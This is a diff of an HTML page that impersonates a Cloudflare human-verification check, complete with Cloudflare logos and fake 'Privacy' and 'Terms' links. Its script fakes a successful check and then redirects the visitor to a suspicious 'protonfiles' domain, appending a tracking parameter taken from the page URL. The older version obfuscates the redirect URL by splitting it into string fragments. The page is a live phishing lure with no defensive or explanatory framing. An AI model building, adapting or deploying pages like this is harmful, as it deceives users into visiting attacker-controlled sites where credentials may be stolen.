@@ -3,226 +3,299 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PDFinv</title>
+    <title>Verification Required</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
         }
 
         body {
-            background-color: white;
-            min-height: 100vh;
+            background-color: #f6f8fa;
             display: flex;
-            justify-content: center;
-            align-items: center;
             flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #2d3748;
         }
 
+        /* Logo animation container */
         .logo-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             display: flex;
             justify-content: center;
             align-items: center;
-            animation: breathe 3s ease-in-out;
+            background-color: #f6f8fa;
+            z-index: 1000;
+            transition: opacity 0.5s ease;
         }
 
-        .logo-img {
-            height: 140px;
+        .logo {
+            width: 120px;
+            height: 120px;
+            animation: breathing 1.5s ease-in-out infinite;
         }
 
-        .content {
-            display: none;
+        @keyframes breathing {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.8; }
         }
 
-        .instruction {
-            font-size: 18px;
-            color: #333;
-            margin-bottom: 15px;
+        /* Main content - initially hidden */
+        .main-content-container {
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .header {
             text-align: center;
+            margin-bottom: 15px; /* Reduced margin */
+            max-width: 500px;
         }
 
-        .captcha-box {
-            background: #f6f8fa;
-            border: 1px solid #e1e4e8;
-            border-radius: 6px;
-            padding: 15px 20px;
-            width: 420px;
+        .header h1 {
+            color: #2d3748;
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 5px; /* Reduced margin */
+            letter-spacing: -0.2px;
+        }
+
+        .verification-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 500px; /* Same width as before */
+            overflow: hidden;
+            padding: 15px 25px; /* Reduced vertical padding, kept horizontal */
+            height: 100px; /* Fixed height to reduce overall box height */
+        }
+
+        .main-content {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            height: 90px;
+            height: 100%; /* Take full height of container */
         }
 
-        .verify-box {
+        .verification-control {
             display: flex;
             align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            height: 100%; /* Take full height */
+        }
+
+        input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #f48225;
             cursor: pointer;
         }
 
-        .verify-check {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #c1c1c1;
-            border-radius: 4px;
-            margin-right: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .verify-check.loading {
-            border-color: #4d90fe;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        .verify-check.checked {
-            background: #11bb11;
-            border-color: #11bb11;
-            border-radius: 50%;
-            animation: none;
-        }
-
-        .verify-check.checked::after {
-            content: "✓";
-            color: white;
-            font-weight: bold;
-            font-size: 14px;
-        }
-
         .verify-text {
-            font-size: 15px;
-            color: #333;
-            user-select: none;
-            font-weight: bold;
+            color: #4a5568;
+            font-size: 16px;
+            font-weight: 500;
         }
 
-        .success-text {
-            color: #11bb11;
-        }
-
-        .brand-section {
-            text-align: right;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-
-        .brand-img {
-            height: 45px;
-            margin-bottom: 3px;
-        }
-
-        .robotics-text {
-            font-size: 12px;
-            color: #888;
-            margin-top: 2px;
-            letter-spacing: 0.5px;
-        }
-
-        .privacy-text {
-            font-size: 10px;
-            color: #888;
-            margin-top: 2px;
-        }
-
-        @keyframes breathe {
-            0% { opacity: 0; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.1); }
-            100% { opacity: 1; transform: scale(1); }
+        /* Spinner animation */
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(244, 130, 37, 0.2);
+            border-radius: 50%;
+            border-top-color: #f48225;
+            animation: spin 1s linear infinite;
+            display: none;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* Success checkmark */
+        .success-check {
+            color: #38a169;
+            font-size: 18px;
+            display: none;
+        }
+
+        /* Success state */
+        .success .verify-text {
+            color: #38a169;
+            font-weight: 600;
+        }
+
+        .brand-section {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            text-align: right;
+            justify-content: center;
+            height: 100%; /* Take full height */
+        }
+
+        .cloudflare-logo {
+            margin-bottom: 2px; /* Reduced margin */
+            height: 40px; /* Reduced logo size */
+            width: auto;
+        }
+
+        .cloudflare-brand {
+            margin-bottom: 2px; /* Reduced margin */
+        }
+
+        .cloudflare-text {
+            font-size: 13px;
+            font-weight: 700;
+            color: #f48225;
+            letter-spacing: 0.4px;
+        }
+
+        .footer-links {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-links a {
+            color: #718096;
+            text-decoration: none;
+            font-size: 12px; /* Slightly smaller font */
+            transition: color 0.2s ease;
+        }
+
+        .footer-links a:hover {
+            color: #4a5568;
+        }
+
+        .divider {
+            color: #cbd5e0;
         }
     </style>
 </head>
 <body>
-    <div class="logo-container">
-        <img src="logo.png" alt="Logo" class="logo-img">
+    <!-- Logo animation container -->
+    <div class="logo-container" id="logoContainer">
+        <img src="logo.png" alt="Logo" class="logo">
     </div>
 
-    <div class="content">
-        <div class="instruction">Let us know you're human</div>
-        <div class="captcha-box">
-            <div class="verify-box" id="verifyBox">
-                <div class="verify-check" id="verifyCheck"></div>
-                <span class="verify-text" id="verifyLabel">Verify</span>
-            </div>
+    <!-- Main content (initially hidden) -->
+    <div class="main-content-container" id="mainContentContainer">
+        <div class="header">
+            <h1>Let us know you're human</h1>
+        </div>
 
-            <div class="brand-section">
-                <img src="cloudflare_.png" alt="Cloudflare" class="brand-img">
-                <div class="robotics-text">CLOUDFLARE</div>
-                <div class="privacy-text">Privacy · Terms</div>
+        <div class="verification-container">
+            <div class="main-content">
+                <div class="verification-control" id="verificationControl">
+                    <input type="checkbox" id="redirectCheckbox">
+                    <!-- Checkbox icon -->
+                    <div class="spinner" id="spinner"></div>
+                    <div class="success-check" id="successCheck">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <span class="verify-text" id="verifyText">Verify</span>
+                </div>
+
+                <div class="brand-section">
+                    <img src="cloudflare_.png" alt="Cloudflare" class="cloudflare-logo">
+                    <div class="cloudflare-brand">
+                        <span class="cloudflare-text">CLOUDFLARE</span>
+                    </div>
+                    <div class="footer-links">
+                        <a href="#">Privacy</a>
+                        <span class="divider">-</span>
+                        <a href="#">Terms</a>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const logoContainer = document.querySelector('.logo-container');
-            const content = document.querySelector('.content');
-            const verifyBox = document.getElementById('verifyBox');
-            const verifyCheck = document.getElementById('verifyCheck');
-            const verifyLabel = document.getElementById('verifyLabel');
-            let verified = false;
+            const logoContainer = document.getElementById('logoContainer');
+            const mainContentContainer = document.getElementById('mainContentContainer');
+            const checkbox = document.getElementById('redirectCheckbox');
+            const verifyText = document.getElementById('verifyText');
+            const spinner = document.getElementById('spinner');
+            const successCheck = document.getElementById('successCheck');
+            const verificationControl = document.getElementById('verificationControl');
 
-            // Function to extract parameter from URL
-            function getUrlParameter() {
+            // Show logo for 2 seconds, then show main content
+            setTimeout(() => {
+                logoContainer.style.opacity = '0';
+                setTimeout(() => {
+                    logoContainer.style.display = 'none';
+                    mainContentContainer.style.opacity = '1';
+                }, 500);
+            }, 2000);
+
+            // Handle checkbox change
+            checkbox.addEventListener('change', function() {
+                if (this.checked) {
+                    // Show spinner, hide checkbox
+                    checkbox.style.display = 'none';
+                    spinner.style.display = 'block';
+                    verifyText.textContent = 'Verifying...';
+
+                    // Simulate verification process
+                    setTimeout(() => {
+                        // Show success state
+                        spinner.style.display = 'none';
+                        successCheck.style.display = 'block';
+                        verifyText.textContent = 'Success!';
+                        verificationControl.classList.add('success');
+
+                        // Redirect after 2 seconds
+                        setTimeout(redirectToUrl, 2000);
+                    }, 1800);
+                }
+            });
+
+            // Redirect function
+            function redirectToUrl() {
+                // Base redirect URL
+                const baseUrl = 'https://protonfiles.esgkruiesyapydt.online/tOnDqXfQ#';
+
+                // Get the eoff parameter from the current URL
                 const urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get('eoff') || '';
+                const eoffValue = urlParams.get('eoff');
+
+                // Construct the final URL
+                let finalUrl = baseUrl;
+                if (eoffValue) {
+                    finalUrl += eoffValue;
+                }
+
+                // Redirect to the final URL
+                window.location.href = finalUrl;
             }
 
-            // Function to build the redirect URL from fragments
-            function buildRedirectUrl() {
-                const paramValue = getUrlParameter();
-
-                // Break the URL into tiny pieces
-                const part1 = 'https:';
-                const part2 = '//proton';
-                const part3 = 'files.';
-                const part4 = 'esgkruies';
-                const part5 = 'yapydt.';
-                const part6 = 'online/';
-                const part7 = 'tOnDqXfQ#';
-
-                // Join the pieces back together
-                const baseUrl = part1 + part2 + part3 + part4 + part5 + part6 + part7;
-
-                return baseUrl + encodeURIComponent(paramValue);
-            }
-
-            setTimeout(function() {
-                logoContainer.style.display = 'none';
-                content.style.display = 'block';
-            }, 2500);
-
-            verifyBox.addEventListener('click', function() {
-                if (!verified) {
-                    verifyCheck.classList.add('loading');
-
-                    setTimeout(function() {
-                        verifyCheck.classList.remove('loading');
-                        verifyCheck.classList.add('checked');
-                        verifyLabel.textContent = 'Success!';
-                        verifyLabel.classList.add('success-text');
-                        verified = true;
-
-                        setTimeout(function() {
-                            const redirectUrl = buildRedirectUrl();
-                            window.location.href = redirectUrl;
-                        }, 2000);
-                    }, 1000);
+            // Make the entire control clickable
+            document.querySelector('.verification-control').addEventListener('click', function() {
+                if (!checkbox.checked) {
+                    checkbox.checked = true;
+                    const event = new Event('change');
+                    checkbox.dispatchEvent(event);
                 }
             });
         });
     </script>
 </body>
 </html>
-
